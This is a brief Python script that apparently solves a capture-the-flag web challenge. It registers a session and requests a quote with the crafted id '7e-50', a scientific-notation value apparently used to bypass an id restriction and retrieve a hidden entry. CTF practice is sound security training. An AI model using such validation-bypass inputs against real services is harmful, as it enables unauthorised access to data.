import requests
import base64


url = "https://quotes.challs.pwnoh.io/"

s = requests.Session()

r = s.get(url + '/register')
r = s.get(url + '/quote', params={'id': "7e-50"})
print(r.json()['quote'])

